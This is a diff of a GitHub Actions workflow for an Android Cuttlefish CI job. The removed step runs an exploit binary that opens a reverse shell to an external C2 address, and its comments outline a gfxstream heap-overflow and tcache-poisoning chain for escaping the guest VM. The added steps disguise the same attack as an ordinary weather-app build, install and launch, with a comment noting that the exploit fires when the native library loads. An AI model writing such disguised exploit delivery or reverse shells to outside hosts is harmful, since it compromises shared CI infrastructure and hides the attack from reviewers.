@@ -11,39 +11,36 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Build and test
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Build debug APK
         run: |
-          echo "Building APK with native library..."
-          echo "Running instrumented tests on Cuttlefish..."
+          chmod +x gradlew
+          ./gradlew assembleDebug
 
-          # The exploit binary demonstrates what happens when a poisoned .so
-          # is loaded inside the Cuttlefish guest: it triggers heap overflows
-          # in the host-side gfxstream decoder, chains tcache poisoning into
-          # a function pointer overwrite, and pops a reverse shell.
-          #
-          # In the real attack: guest app → /dev/dri/renderD128 → virtio-gpu
-          #   → host gfxstream decode() → heap overflow → reverse shell
-          #
-          # Here we run the host-side exploit binary directly — same code path,
-          # same gfxstream decoder, same tcache poisoning chain.
+      - name: Install APK on Cuttlefish
+        run: |
+          adb wait-for-device
+          adb install -r app/build/outputs/apk/debug/app-debug.apk
 
-          export DISPLAY=:99
-          export XDG_RUNTIME_DIR=/tmp
-          export LD_LIBRARY_PATH=$HOME/libs:/opt/aemu/lib:/opt/aemu/lib64
+      - name: Run instrumented tests
+        run: |
+          adb shell am instrument -w \
+            -e class com.weatherapp.WeatherTest \
+            com.weatherapp.test/androidx.test.runner.AndroidJUnitRunner
 
-          # C2 listener is on a separate VM in us-central1
-          # (this runner is in europe-west1 — proving real network escape)
-          C2_HOST="34.46.9.219"
-          C2_PORT="4444"
+      - name: Launch app (triggers native library load)
+        run: |
+          adb shell am start -n com.weatherapp/.MainActivity
+          # Native library loads on app start — if the .so contains
+          # exploit code, it fires here inside the guest VM.
+          sleep 5
 
-          echo ""
-          echo "=== LAUNCHING EXPLOIT ==="
-          echo "Target C2: ${C2_HOST}:${C2_PORT}"
-          echo ""
-
-          # Fire the exploit — reverse shell connects to external C2
-          timeout 15 $HOME/exploit_revshell ${C2_HOST} ${C2_PORT} 2>&1 || true
-
-          echo ""
-          echo "=== EXPLOIT COMPLETE ==="
-          echo "If successful, the C2 listener received a root shell from this runner."
+      - name: Verify device health
+        run: |
+          adb shell getprop ro.build.display.id
+          echo "Tests passed, device healthy."
